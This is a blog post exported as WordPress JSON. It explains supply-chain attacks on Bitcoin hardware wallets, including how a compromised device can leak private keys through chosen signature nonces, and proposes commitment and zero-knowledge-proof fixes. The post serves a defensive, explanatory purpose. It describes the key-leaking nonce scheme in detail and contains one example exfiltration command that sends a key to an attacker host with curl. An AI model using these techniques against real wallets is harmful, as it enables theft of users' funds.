{"id":3440,"date":"2019-01-05T21:18:56","date_gmt":"2019-01-05T21:18:56","guid":{"rendered":"https:\/\/specter.solutions\/?p=3440"},"modified":"2021-10-19T09:51:35","modified_gmt":"2021-10-19T09:51:35","slug":"hardware-wallets-can-be-hacked-but-this-is-fine","status":"publish","type":"post","link":"https:\/\/specter.solutions\/hardware-wallets-can-be-hacked-but-this-is-fine\/","title":{"rendered":"Hardware wallets can be hacked, but this is fine"},"content":{"rendered":"\t\t<div data-elementor-type=\"wp-post\" data-elementor-id=\"3440\" class=\"elementor elementor-3440\">\n\t\t\t\t\t\t<div class=\"elementor-inner\">\n\t\t\t\t<div class=\"elementor-section-wrap\">\n\t\t\t\t\t\t\t\t\t<section class=\"elementor-section elementor-top-section elementor-element elementor-element-97342ab elementor-section-boxed elementor-section-height-default elementor-section-height-default\" data-id=\"97342ab\" data-element_type=\"section\">\n\t\t\t\t\t\t<div class=\"elementor-container elementor-column-gap-default\">\n\t\t\t\t\t\t\t<div class=\"elementor-row\">\n\t\t\t\t\t<div class=\"elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-ffa448b\" data-id=\"ffa448b\" data-element_type=\"column\">\n\t\t\t<div class=\"elementor-column-wrap elementor-element-populated\">\n\t\t\t\t\t\t\t<div class=\"elementor-widget-wrap\">\n\t\t\t\t\t\t<div class=\"elementor-element elementor-element-0a9f6a1 elementor-widget elementor-widget-text-editor\" data-id=\"0a9f6a1\" data-element_type=\"widget\" data-widget_type=\"text-editor.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-text-editor elementor-clearfix\">\n\t\t\t\t<p id=\"4691\" class=\"gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">The recent <a class=\"ey hi\" href=\"https:\/\/www.youtube.com\/watch?v=Y1OBIGslgGM\" target=\"_blank\" rel=\"noopener nofollow\">wallet.fail talk<\/a> on the 35c3 conference showed that even the best hardware wallets can be hacked. And if some wallet manufacturers claim that they are not vulnerable, I would think twice before trusting these statements.<\/p><p id=\"653d\" class=\"gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">In this post, I want to focus on supply channel attacks and how to use the hardware wallet even if it is compromised. Supply channel attacks are very appealing for hackers as they affect many devices at once and may not require any further interaction with the device by the attacker. Just ship and wait. Let\u2019s discuss what the attacker can do and how we can stop him. We will start with very simple countermeasures and finally get to a pretty fancy one with some math involved.<\/p>\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-9549900 elementor-widget elementor-widget-image\" data-id=\"9549900\" data-element_type=\"widget\" data-widget_type=\"image.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-image\">\n\t\t\t\t\t\t\t\t\t<figure class=\"wp-caption\">\n\t\t\t\t\t\t\t\t\t\t<img loading=\"lazy\" decoding=\"async\" width=\"911\" height=\"439\" src=\"https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-4YfNTC3xL3emT_Gu7-1ayg.png\" class=\"attachment-large size-large\" alt=\"\" srcset=\"https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-4YfNTC3xL3emT_Gu7-1ayg.png 911w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-4YfNTC3xL3emT_Gu7-1ayg-300x145.png 300w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-4YfNTC3xL3emT_Gu7-1ayg-768x370.png 768w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-4YfNTC3xL3emT_Gu7-1ayg-600x289.png 600w\" sizes=\"(max-width: 911px) 100vw, 911px\" \/>\t\t\t\t\t\t\t\t\t\t\t<figcaption class=\"widget-image-caption wp-caption-text\">Storing Bitcoins on a hacked hardware wallet? This is fine.<\/figcaption>\n\t\t\t\t\t\t\t\t\t\t<\/figure>\n\t\t\t\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-c72e1aa elementor-widget elementor-widget-text-editor\" data-id=\"c72e1aa\" data-element_type=\"widget\" data-widget_type=\"text-editor.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-text-editor elementor-clearfix\">\n\t\t\t\t<div><div><p data-selectable-paragraph=\"\">The ultimate goal of the attacker is to get our private keys. He can potentially replace the firmware of the device, replace the secure element with a malicious chip or include hardware implants to do Bad USB attacks or to send our private keys over the air.<\/p><p data-selectable-paragraph=\"\">Mobile networks and SigFox are available almost everywhere and the attacker doesn\u2019t need to be around to catch the signal. RF shielding can block all wireless implants \u2014 a metal bucket will do the job. There are also commercial products available for phones and other small devices. Looks too paranoid? Depends on the amount you own\u2026<\/p><\/div><\/div>\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-f642601 elementor-widget elementor-widget-image\" data-id=\"f642601\" data-element_type=\"widget\" data-widget_type=\"image.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-image\">\n\t\t\t\t\t\t\t\t\t<figure class=\"wp-caption\">\n\t\t\t\t\t\t\t\t\t\t<img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"282\" src=\"https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-VB8odGWd62PgzHOzD2GG4w-1024x282.png\" class=\"attachment-large size-large\" alt=\"\" srcset=\"https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-VB8odGWd62PgzHOzD2GG4w-1024x282.png 1024w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-VB8odGWd62PgzHOzD2GG4w-300x83.png 300w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-VB8odGWd62PgzHOzD2GG4w-768x211.png 768w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-VB8odGWd62PgzHOzD2GG4w-600x165.png 600w, https:\/\/specter.solutions\/wp-content\/uploads\/2021\/01\/1-VB8odGWd62PgzHOzD2GG4w.png 1527w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" \/>\t\t\t\t\t\t\t\t\t\t\t<figcaption class=\"widget-image-caption wp-caption-text\">RF shielding nano-tech<\/figcaption>\n\t\t\t\t\t\t\t\t\t\t<\/figure>\n\t\t\t\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-e6462d2 elementor-widget elementor-widget-text-editor\" data-id=\"e6462d2\" data-element_type=\"widget\" data-widget_type=\"text-editor.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-text-editor elementor-clearfix\">\n\t\t\t\t<div><div><p data-selectable-paragraph=\"\">Next, generating the private keys on a compromised device is a bad idea, so we should use our own source of entropy instead. We can use dices, coins or any other source of entropy. The best way is to use multiple entropy sources and XOR their outputs. It may be tricky to generate a valid mnemonic from the dices, but it\u2019s doable.<\/p><p data-selectable-paragraph=\"\">Also, plugging a potentially malicious device to the computer may cause problems. Even though a Bad USB attack is very limited, plugging in the device that can pretend to be a keyboard, start a terminal and run arbitrary code like <code>curl http:\/\/attacker.com\/?pk=<\/code> is scary. So we should make our hardware wallet air-gaped. With ColdCard it\u2019s simple \u2014 it is air-gapped by design. Trezor promises to implement this feature \u201cin two weeks\u201d. For any other device, we can use a dedicated air-gapped computer to connect the hardware wallet, sign a transaction there, save the signed transaction to SD card and move it to the online machine. And only then we double-check and broadcast the transaction to the network.<\/p><p data-selectable-paragraph=\"\">Now, the only data passed from the hardware wallet to the outside world is our valid bitcoin transaction. Nothing could go wrong, right? Not quite\u2026<\/p><h3 data-selectable-paragraph=\"\">\u00a0<\/h3><h3 data-selectable-paragraph=\"\"><b>Chosen nonce attack<\/b><\/h3><p data-selectable-paragraph=\"\">Do you remember how we sign a bitcoin transaction? We take a hash of the transaction and calculate the signature:<\/p><p data-selectable-paragraph=\"\"><strong><em>(r, s) = (r, (h+r\u22c5pk)\/k)<\/em><\/strong><\/p><p data-selectable-paragraph=\"\">Here <strong><em>pk<\/em><\/strong> is our private key, <strong><em>h<\/em><\/strong> is the hash of the transaction, <strong><em>k<\/em><\/strong> is a random or pseudorandom number and <strong><em>r<\/em><\/strong> is an <strong><em>x<\/em><\/strong>-coordinate of the public point <strong><em>R = k\u00d7G<\/em><\/strong>. And this pair <strong><em>(r, s)<\/em><\/strong> is the signature that we put into the transaction and broadcast to the network.<\/p><p data-selectable-paragraph=\"\">As we blocked any other possibility for the hardware wallet to talk to the external world, its goal will be to generate a valid signature that leaks some information about our private keys. Then, the attacker can reconstruct the private keys by monitoring these transactions on the blockchain. The only way to do it is to generate a nonce <strong><em>k<\/em><\/strong> in a particular way.<\/p><p data-selectable-paragraph=\"\">Ideally, the nonce <strong><em>k<\/em><\/strong> should be either chosen at random or deterministically derived from the message and the private key (there is a <a href=\"https:\/\/tools.ietf.org\/html\/rfc6979\" target=\"_blank\" rel=\"noopener nofollow\">standard<\/a> for that). But when the hardware wallet is hacked, the attacker can choose any number he likes. And our computer can\u2019t even check how this nonce was generated.<\/p><p data-selectable-paragraph=\"\">Leaking a single private key in this scenario is extremely easy \u2014 the hacked wallet just uses a nonce that is known to the attacker. For example, the nonce can be derived by the same deterministic algorithm but using an attacker\u2019s key instead of the user\u2019s private key. Then the attacker can solve a single linear equation and get the private key from the <strong><em>s<\/em><\/strong> value of the signature:<\/p><p data-selectable-paragraph=\"\"><strong><em>pk = (s\u22c5k \u2013 h)\/r<\/em><\/strong><\/p><p data-selectable-paragraph=\"\">I created a <a href=\"https:\/\/live.blockcypher.com\/btc-testnet\/tx\/3d1647bf88c3a3036a10f6f9a0bd4a2015189b0d74a99bc513c505909d575dea\/\" target=\"_blank\" rel=\"noopener nofollow\">testnet transaction<\/a> to demonstrate this attack. The nonce is generated by the wallet according to the standard deterministic algorithm but instead of our private key, it uses attacker\u2019s secret key (<code>0xf00dbabe<\/code>). We can easily extract the private key now and steal all the funds. A python notebook constructing this transaction and recovering the key is on <a href=\"https:\/\/github.com\/stepansnigirev\/chosen_nonce_demo\/blob\/master\/single_key.ipynb\" target=\"_blank\" rel=\"noopener nofollow\">GitHub<\/a>.<\/p><\/div><\/div>\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-cc0e5c7 elementor-widget-divider--view-line elementor-widget elementor-widget-divider\" data-id=\"cc0e5c7\" data-element_type=\"widget\" data-widget_type=\"divider.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t<div class=\"elementor-divider\">\n\t\t\t<span class=\"elementor-divider-separator\">\n\t\t\t\t\t\t<\/span>\n\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-e87ad25 elementor-widget elementor-widget-text-editor\" data-id=\"e87ad25\" data-element_type=\"widget\" data-widget_type=\"text-editor.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-text-editor elementor-clearfix\">\n\t\t\t\t<p id=\"2bbe\" class=\"gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">This simple attack works only if we are re-using the same addresses. Nowadays we use HD wallets and when the transaction gets to the blockchain the spending address is already empty and the attacker gets a private key of an empty address. What we want instead is to get the <em class=\"kj\">master private key<\/em>. The master private key is <a class=\"ey hi\" href=\"https:\/\/github.com\/bitcoin\/bips\/blob\/master\/bip-0032.mediawiki\" target=\"_blank\" rel=\"noopener nofollow\">64 bytes long<\/a> and it is not directly involved in the signing equations. We need to find another way to leak it via nonces.<\/p><p id=\"fbf6\" class=\"gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">We are going to do the following: for every outgoing transaction we choose a nonce <strong class=\"gm ki\"><em class=\"kj\">k<\/em><\/strong> such that the number <strong class=\"gm ki\"><em class=\"kj\">r <\/em><\/strong>(<strong class=\"gm ki\"><em class=\"kj\">x<\/em><\/strong>-coordinate of the point <strong class=\"gm ki\"><em class=\"kj\">R=k\u00d7G<\/em><\/strong>) starts with an index <strong class=\"gm ki\"><em class=\"kj\">i<\/em><\/strong> followed by the corresponding byte of the master private key <strong class=\"gm ki\">mpk[i]<\/strong>. Then the <strong class=\"gm ki\"><em class=\"kj\">r<\/em><\/strong> part of every signature will look like <strong class=\"gm ki\"><em class=\"kj\">01mpk[1]&lt;some random crap&gt;<\/em><\/strong>, <strong class=\"gm ki\"><em class=\"kj\">02mpk[2]&lt;other random crap&gt; <\/em><\/strong>and so on. To find <strong class=\"gm ki\"><em class=\"kj\">k<\/em><\/strong> giving us the right <strong class=\"gm ki\"><em class=\"kj\">r<\/em><\/strong> we need to try a few times. On every try we increase <strong class=\"gm ki\"><em class=\"kj\">k <\/em><\/strong>by 1 and add G to the corresponding point <strong class=\"gm ki\"><em class=\"kj\">R<\/em><\/strong>. As addition is much faster than multiplication we can find a correct nonce pretty quickly \u2014 the user may not even notice. And roughly after ~64 transactions, we will be able to reconstruct the full master private key. To add some privacy for the attacker we can find nonces that start not with <strong class=\"gm ki\"><em class=\"kj\">i mkp[i]<\/em><\/strong> but with a XOR of this with the attaker\u2019s key: <strong class=\"gm ki\"><em class=\"kj\">i mpk[i] <\/em><\/strong>\u2295<strong class=\"gm ki\"><em class=\"kj\"> attacker_key<\/em><\/strong>. Then only the attacker can reconstruct the key and the signatures don\u2019t look suspicious.<\/p><p id=\"bfb6\" class=\"gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">Finding all transactions corresponding to the same wallet is not very hard \u2014 normally all transactions from the same HD wallet can be linked to each other, especially when we know what to expect in the first bytes of the signature.<\/p><p id=\"3ad4\" class=\"gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">To demo this attack I created a set of bitcoin transactions on the testnet starting from <a class=\"ey hi\" href=\"https:\/\/live.blockcypher.com\/btc-testnet\/tx\/5795b9ab35c0bc10f39f3d9a10193d3511225d17d89f36890f7adb8b7af440c7\/\" target=\"_blank\" rel=\"noopener nofollow\">this<\/a> to <a class=\"ey hi\" href=\"https:\/\/live.blockcypher.com\/btc-testnet\/tx\/dd39e8dbb028977829f5250725c66bd7370a1f2d8444819735dd7ead02b7557d\/\" target=\"_blank\" rel=\"noopener nofollow\">this<\/a>. I used 0x00 as an attacker\u2019s key so anyone can see the bytes of the master private key in the nonces of the signatures:<\/p>\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-a550b55 elementor-widget elementor-widget-html\" data-id=\"a550b55\" data-element_type=\"widget\" data-widget_type=\"html.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t<pre>\n<code>\ntx 0:  r = 0057360015b25dc6ec...\ntx 1:  r = 016d24c28dff49f70f...\n...\ntx 63: r = 3f94476a5630120121...\n<\/code>\n<\/pre>\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"elementor-element elementor-element-2483499 elementor-widget elementor-widget-text-editor\" data-id=\"2483499\" data-element_type=\"widget\" data-widget_type=\"text-editor.default\">\n\t\t\t\t<div class=\"elementor-widget-container\">\n\t\t\t\t\t\t\t\t<div class=\"elementor-text-editor elementor-clearfix\">\n\t\t\t\t<p>And we can easily reconstruct the master private key of the attacked wallet \u2014 <code>576d...94<\/code> . Full code is also on <a href=\"https:\/\/github.com\/stepansnigirev\/chosen_nonce_demo\/blob\/master\/HD_key.ipynb\" target=\"_blank\" rel=\"noopener nofollow\">GitHub<\/a>.<\/p><p>Now the question is, can we fix it somehow? There are two ways. Both<br \/>have certain pros and cons. The core problem in the current protocol is<br \/>that we allow the hardware wallet to <em>choose a value that will be directly encoded in the transaction<\/em>.<br \/>We need to take this freedom away either by forcing the hardware wallet<br \/>to use a certain algorithm or by randomizing its choice using<br \/>additional offset.<\/p><h3 data-selectable-paragraph=\"\">\u00a0<\/h3><h3 data-selectable-paragraph=\"\"><b>Fix 1. Commitments.<\/b><\/h3><p data-selectable-paragraph=\"\">First,<br \/>let\u2019s talk about randomization. We allow the hardware wallet to choose a<br \/>nonce however it wants, but then we fix this choice by asking for a<br \/>commitment and provide an additional random number for an offset.<br \/>Hardware wallet then has to add this number to its nonce and use their<br \/>sum in the signature scheme. In this situation, if one of the devices is<br \/>behaving properly, the resulting nonce is random and it can\u2019t contain<br \/>any additional information.<\/p><p data-selectable-paragraph=\"\">To be more precise we require the following procedure:<\/p><ul><li data-selectable-paragraph=\"\">the hardware wallet chooses a random number <strong><em>k1 <\/em><\/strong>and commits to it by disclosing a corresponding point <strong><em>R1 = k1\u00d7G<\/em><\/strong><\/li><li data-selectable-paragraph=\"\">the computer sends unsigned transaction data and another random number <strong><em>k2<\/em><\/strong> to the hardware wallet<\/li><li data-selectable-paragraph=\"\">the hardware wallet signs the transaction using the nonce <strong><em>k=k1+k2<\/em><\/strong><\/li><li data-selectable-paragraph=\"\">the computer verifies that the signature and the transaction are valid and that <strong><em>r<\/em><\/strong> part of the signature is an <strong><em>x<\/em><\/strong>-coordinate of the point <strong><em>R=k\u00d7G=R1+k2\u00d7G<\/em><\/strong>, where <strong><em>R1<\/em><\/strong> is a point the hardware wallet committed to in the beginning.<\/li><\/ul><p data-selectable-paragraph=\"\">This<br \/>way our computer checks that the hardware wallet used the nonce it<br \/>committed to and added an offset that we provided. There are two<br \/>drawbacks in this scheme:<\/p><ul><li data-selectable-paragraph=\"\">the<br \/>protocol requires several communication rounds, so with an air-gapped<br \/>hardware wallet, we will need to move between the computer and the<br \/>hardware wallet twice. Or we take two SD cards (one for the commitment<br \/>and another one for the second random number and signed transaction).<\/li><li data-selectable-paragraph=\"\">the hardware wallet can\u2019t use deterministic <strong><em>k<\/em><\/strong><br \/>anymore, it has to use truly random numbers from hardware RNG. And<br \/>usually RNG = problems. The reason to use RNG is that if the computer<br \/>will ask the wallet to sign the same transaction <em>twice<\/em> and provide <em>two different<\/em> numbers <strong><em>k2<\/em><\/strong>, <strong><em>k2&#8242;<\/em><\/strong>, usage of the deterministic <strong><em>k1<\/em><\/strong> will immediately reveal the secret key.<\/li><\/ul><p data-selectable-paragraph=\"\">In total, this protocol is very easy to implement, but it is less convenient and may require a good source of randomness on the hardware wallet.<\/p><blockquote class=\"kz la lb\"><p id=\"acd9\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\"><strong class=\"gm ki\">Update<\/strong>: We can still use deterministic <strong class=\"gm ki\">k<\/strong> generation if the computer commits to its <strong class=\"gm ki\">k2<\/strong> and the hardware wallet uses this commitment to derive its <strong class=\"gm ki\">k1<\/strong>. The whole communication process will look like this:<\/p><p id=\"2ffd\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">\u2022 the computer chooses some value <strong class=\"gm ki\">k2<\/strong>. Then it sends to the hardware wallet an unsigned transaction together with the commitment <strong class=\"gm ki\">c=sha256(k2)<\/strong><em class=\"dn\">.<\/em><\/p><p id=\"4b48\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">\u2022 the hardware wallet deterministically calculates a nonce <strong class=\"gm ki\">k1<\/strong> from the transaction, the private key and the computer\u2019s commitment <strong class=\"gm ki\"><em class=\"dn\">c<\/em><\/strong>. Then the hardware wallet commits to this nonce by revealing <strong class=\"gm ki\">R1=k1\u00d7G<\/strong> to the computer.<\/p><p id=\"fd4a\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">\u2022 the computer sends its nonce <strong class=\"gm ki\">k2<\/strong> to the hardware wallet.<\/p><p id=\"0c90\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">\u2022 the hardware wallet checks that the nonce <strong class=\"gm ki\">k2<\/strong> hashes to the value <strong class=\"gm ki\">c<\/strong> and signs the transaction using the nonce <strong class=\"gm ki\">k=k1+k2<\/strong>.<\/p><p id=\"2203\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">\u2022 the computer verifies that the signature and the transaction are valid and that <strong class=\"gm ki\">r<\/strong> part of the signature is an <strong class=\"gm ki\">x<\/strong>-coordinate of the point <strong class=\"gm ki\">R=k\u00d7G=R1+k2\u00d7G<\/strong>.<\/p><p id=\"ef14\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">\u2022 now it\u2019s safe to broadcast the transaction<\/p><p id=\"a33b\" class=\"gk gl kj gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch\" data-selectable-paragraph=\"\">Thanks to <a class=\"ey hi\" href=\"https:\/\/twitter.com\/n1ckler\" target=\"_blank\" rel=\"noopener nofollow\">@n1ckler<\/a> for bringing this up. There is also a <a class=\"ey hi\" href=\"https:\/\/github.com\/bitcoin-core\/secp256k1\/pull\/572\" target=\"_blank\" rel=\"noopener nofollow\">pull request<\/a> to bitcoin core implementing this feature. And using this protocol with an airgapped wallet is not that painful \u2014 we can use two SD cards to sign the transaction. The first one will contain an unsigned transaction, a commitment <strong class=\"gm ki\">c=sha256(k2)<\/strong> from the computer and later a commitment <strong class=\"gm ki\">R1<\/strong> from the hardware wallet. The second one will contain the nonce <strong class=\"gm ki\">k2<\/strong> and later a signed transaction from the hardware wallet.<\/p><\/blockquote><p>\u00a0<\/p><h3><b>Fix 2. Zero-knowledge proofs<\/b><\/h3><p>Another option is to force the hardware wallet to use a particular algorithm to generate the nonce and to require a zero-knowledge proof of that. The current standard (RFC6979) uses SHA256 to derive a deterministic nonce from the message and the private key, but the corresponding zero-knowledge proof is extremely hard to calculate. Especially for a hardware wallet.<\/p><p>If you don\u2019t know how zero-knowledge proofs work there is a very nice post by Vitalik Buterin on that (also check the references). Without going into details, zero-knowledge proofs are pretty tolerant to linear operations but blow up in size and complexity as soon as you add multiplications and other non-linear operations. Unfortunately, common hashing algorithms are very non-linear. Roughly speaking, calculating a ZK proof of SHA256 will be as difficult as calculating 10000 signatures. For a hardware wallet, it could take several minutes to generate a proof. Not very usable.<\/p><p>Fortunately, there are other hashing algorithms that are more ZK-friendly. In particular, MiMC hashing algorithm was specifically designed to be used with ZK proofs. We can tailor the deterministic nonce generation algorithm to use MiMC instead of SHA256. With MiMC the hardware wallet will be able to generate a proof in 20 seconds instead of several minutes. Then we can require the hardware wallet to include a ZK prove that this particular deterministic algorithm was used to generate a nonce for every signature. And therefore we can be sure that no data leak is possible. Hardware wallet doesn\u2019t have any choice now. Everything is deterministic and provable.<\/p><p>There are two minor problems with this protocol:<\/p><ul><li>MiMC is a pretty new hashing algorithm (2016), and we should make sure it is safe to use before deploying it in a real application. In particular, we need to be sure that it is not biased, uniformly distributed and blah blah blah.<\/li><li>ZK proofs are memory and computationally intensive. Especially when we talk about low performance embedded devices like 180MHz microcontrollers used in hardware wallets. And they are also theoretically complicated\u2026 They are pretty hard to understand and implement correctly. But still, doable.<\/li><\/ul><h3>\u00a0<\/h3><h3><b>Conclusion<\/b><\/h3><p>It would be nice to see these or similar signing protocols realized in hardware and software wallets. I would definitely use it if I could. I believe we need to improve the security of our bitcoin storage setups and remove trust in manufacturers of our wallet software and firmware. We can\u2019t read all the code we use, but we can verify that the protocol is used correctly.<\/p><p>I really like a phrase I\u2019ve heard in quantum cryptography field: a good cryptographic setup can be verified and used for secure communication even if it was manufactured by an attacker. I would really like to get to the same level of confidence with our bitcoin setups.<\/p><p>And yeah, don\u2019t forget to use your metal bucket and a foil cap!<\/p>\t\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t<\/div>\n\t\t\t\t\t\t<\/div>\n\t\t\t\t\t<\/div>\n\t\t<\/div>\n\t\t\t\t\t\t\t\t<\/div>\n\t\t\t\t\t<\/div>\n\t\t<\/section>\n\t\t\t\t\t\t\t\t\t<\/div>\n\t\t\t<\/div>\n\t\t\t\t\t<\/div>\n\t\t","protected":false},"excerpt":{"rendered":"<p>Here I describe how to live with it. In particular, how the attacker can encode our secrets in bitcoin signatures and how to fix it.<\/p>\n","protected":false},"author":6,"featured_media":3434,"comment_status":"closed","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"inline_featured_image":false,"site-sidebar-layout":"default","site-content-layout":"default","ast-main-header-display":"","ast-hfb-above-header-display":"","ast-hfb-below-header-display":"","ast-hfb-mobile-header-display":"","site-post-title":"","ast-breadcrumbs-content":"","ast-featured-img":"","footer-sml-layout":"","theme-transparent-header-meta":"default","adv-header-id-meta":"","stick-header-meta":"","header-above-stick-meta":"","header-main-stick-meta":"","header-below-stick-meta":"","footnotes":""},"categories":[30],"tags":[],"_links":{"self":[{"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/posts\/3440"}],"collection":[{"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/users\/6"}],"replies":[{"embeddable":true,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/comments?post=3440"}],"version-history":[{"count":47,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/posts\/3440\/revisions"}],"predecessor-version":[{"id":4529,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/posts\/3440\/revisions\/4529"}],"wp:featuredmedia":[{"embeddable":true,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/media\/3434"}],"wp:attachment":[{"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/media?parent=3440"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/categories?post=3440"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/specter.solutions\/wp-json\/wp\/v2\/tags?post=3440"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}